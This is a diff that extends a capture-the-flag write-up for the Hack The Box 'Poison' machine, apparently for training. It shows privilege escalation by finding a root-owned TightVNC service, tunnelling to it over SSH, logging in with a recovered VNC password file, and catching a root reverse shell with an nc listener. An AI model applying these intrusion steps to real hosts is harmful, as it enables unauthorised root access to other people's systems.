@@ -184,7 +184,7 @@ will download the front page of the FreeBSD web site.
 charix@Poison:~ % ls
 secret.zip	user.txt
 ```
-secret.zip looks interesting. Attempt to extract it, and despite being told the file needs a password, can't work out how to enter one so just scp it to the local machine to extract it there.
+secret.zip looks interesting. Attempt to extract it, and despite being told the file needs a password, can't work out how to enter one so just scp it to the local machine to extract it there using the last password retrieved.
 ```bash
 ┌─[htb-jib1337@htb-xyupwgemyw]─[~/Desktop]
 └──╼ $scp charix@10.129.29.223:secret.zip .
@@ -199,4 +199,144 @@ Archive:  secret.zip
 └──╼ $cat secret
 ��[|Ֆz!
 ```
-The secret is retrieved.
+The secret is retrieved. Now back to enumeration.  
+When checking running processes, see that tightvnc is active, and running as root.
+```bash
+charix@Poison:~ % ps -aux
+USER   PID  %CPU %MEM   VSZ   RSS TT  STAT STARTED    TIME COMMAND
+root    11 100.0  0.0     0    16  -  RL   12:02   2:52.19 [idle]
+root     0   0.0  0.0     0   160  -  DLs  12:02   0:00.00 [kernel]
+root     1   0.0  0.1  5408   976  -  ILs  12:02   0:00.00 /sbin/init --
+root     2   0.0  0.0     0    16  -  DL   12:02   0:00.00 [crypto]
+root     3   0.0  0.0     0    16  -  DL   12:02   0:00.00 [crypto returns]
+root     4   0.0  0.0     0    32  -  DL   12:02   0:00.01 [cam]
+root     5   0.0  0.0     0    16  -  DL   12:02   0:00.00 [mpt_recovery0]
+root     6   0.0  0.0     0    16  -  DL   12:02   0:00.00 [sctp_iterator]
+root     7   0.0  0.0     0    16  -  DL   12:02   0:01.21 [rand_harvestq]
+root     8   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod1]
+root     9   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod2]
+root    10   0.0  0.0     0    16  -  DL   12:02   0:00.00 [audit]
+root    12   0.0  0.1     0   736  -  WL   12:02   0:00.16 [intr]
+root    13   0.0  0.0     0    48  -  DL   12:02   0:00.00 [geom]
+root    14   0.0  0.0     0   160  -  DL   12:02   0:00.01 [usb]
+root    15   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod3]
+root    16   0.0  0.0     0    16  -  DL   12:02   0:00.00 [soaiod4]
+root    17   0.0  0.0     0    48  -  DL   12:02   0:00.00 [pagedaemon]
+root    18   0.0  0.0     0    16  -  DL   12:02   0:00.00 [vmdaemon]
+root    19   0.0  0.0     0    16  -  DL   12:02   0:00.00 [pagezero]
+root    20   0.0  0.0     0    32  -  DL   12:02   0:00.00 [bufdaemon]
+root    21   0.0  0.0     0    16  -  DL   12:02   0:00.00 [bufspacedaemon]
+root    22   0.0  0.0     0    16  -  DL   12:02   0:00.01 [syncer]
+root    23   0.0  0.0     0    16  -  DL   12:02   0:00.00 [vnlru]
+root   332   0.0  0.2 10624  2380  -  Is   12:02   0:00.01 dhclient: le0 [priv] (dhclient)
+_dhcp  395   0.0  0.2 10624  2496  -  Is   12:02   0:00.00 dhclient: le0 (dhclient)
+root   396   0.0  0.5  9560  5052  -  Ss   12:02   0:00.01 /sbin/devd
+root   469   0.0  0.2 10500  2396  -  Ss   12:02   0:00.01 /usr/sbin/syslogd -s
+root   622   0.0  0.5 56320  5388  -  S    12:02   0:00.13 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc
+root   697   0.0  0.7 57812  7052  -  Is   12:02   0:00.00 /usr/sbin/sshd
+root   704   0.0  1.1 99172 11516  -  Ss   12:02   0:00.01 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    716   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    717   0.0  1.1 99172 11528  -  S    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    718   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    719   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    720   0.0  1.1 99172 11528  -  I    12:02   0:00.00 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root   721   0.0  0.6 20636  6140  -  Ss   12:03   0:00.01 sendmail: accepting connections (sendmail)
+smmsp  724   0.0  0.6 20636  5968  -  Is   12:03   0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)
+root   728   0.0  0.2 12592  2436  -  Is   12:03   0:00.00 /usr/sbin/cron -s
+root   784   0.0  0.8 85228  7768  -  Is   12:04   0:00.01 sshd: charix [priv] (sshd)
+charix 787   0.0  0.8 85228  7832  -  S    12:04   0:00.01 sshd: charix@pts/1 (sshd)
+root   608   0.0  0.9 23620  8868 v0- I    12:02   0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 
+root   619   0.0  0.7 67220  7060 v0- I    12:02   0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
+root   620   0.0  0.5 37620  5312 v0- I    12:02   0:00.01 twm
+root   775   0.0  0.2 10484  2076 v0  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv0
+root   776   0.0  0.2 10484  2076 v1  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv1
+root   777   0.0  0.2 10484  2076 v2  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv2
+root   778   0.0  0.2 10484  2076 v3  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv3
+root   779   0.0  0.2 10484  2076 v4  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv4
+root   780   0.0  0.2 10484  2076 v5  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv5
+root   781   0.0  0.2 10484  2076 v6  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv6
+root   782   0.0  0.2 10484  2076 v7  Is+  12:03   0:00.00 /usr/libexec/getty Pc ttyv7
+root   699   0.0  0.4 19660  3616  0  Is+  12:02   0:00.01 -csh (csh)
+charix 788   0.0  0.4 19660  3576  1  Ss   12:04   0:00.01 -csh (csh)
+charix 796   0.0  0.3 21208  2652  1  R+   12:05   0:00.00 ps -aux
+```
+Can see the http daemon is also running, but on what port?
+```bash
+charix@Poison:~ % netstat -a -4 -f inet -p tcp
+Active Internet connections (including servers)
+Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
+tcp4       0     44 10.129.1.254.ssh       10.10.14.25.50710      ESTABLISHED
+tcp4       0      0 localhost.smtp         *.*                    LISTEN
+tcp4       0      0 *.http                 *.*                    LISTEN
+tcp4       0      0 *.ssh                  *.*                    LISTEN
+tcp4       0      0 localhost.5801         *.*                    LISTEN
+tcp4       0      0 localhost.5901         *.*                    LISTEN
+```
+It could be either 5801 or 5901. We can check both, starting with 5801.  
+Create port forwards so the ports can be accessed through the SSH tunnel:
+```bash
+charix@Poison:~ % 
+ssh> -L 127.0.0.1:9999:127.0.0.1:5801
+Forwarding port.
+charix@Poison:~ % 
+ssh> -L 127.0.0.1:9998:127.0.0.1:5901
+Forwarding port.
+```
+Then attempt to connect to each port using VNCViewer. The first port doesn't work. The second one successfully connects and asks for a password.
+```bash
+┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
+└─$ vncviewer localhost:9999
+^C
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
+└─$ vncviewer localhost:9998                                                                                                                                                    130 ⨯
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Password: 
+
+```
+
+### 7. Use the secret and get to root
+Try to use the secret by pasting it as the password, but it doesn't work.
+```bash
+┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
+└─$ vncviewer localhost:9998                                                                                                                                                      1 ⨯
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Password: 
+Authentication failed
+```
+I also try other passwords found and none of those work either. However looking at vncviewer's help, there is a argument to pass in a password file.
+```bash
+┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
+└─$ vncviewer --help                                                                                                                                                              1 ⨯
+TightVNC Viewer version 1.3.10
+
+Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
+       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
+       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
+       vncviewer -help
+
+<OPTIONS> are standard Xt options, or:
+        -via <GATEWAY>
+        -shared (set by default)
+        -noshared
+        -viewonly
+        -fullscreen
+        -noraiseonbeep
+        -passwd <PASSWD-FILENAME> (standard VNC authentication)
+```
+Use this with the "secret" file to get logged in as the root user in a graphical interface. Just to get back in my terminal I can spawn a reverse shell back.
+```bash
+┌──(kali㉿kali)-[10.10.14.25]-[~/Desktop]
+└─$ nc -lvnp 9997
+listening on [any] 9997 ...
+connect to [10.10.14.25] from (UNKNOWN) [10.129.1.254] 60983
+# python -c "import pty;pty.spawn('/bin/csh')"
+You have mail.
+root@Poison:/tmp # id
+id
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+```
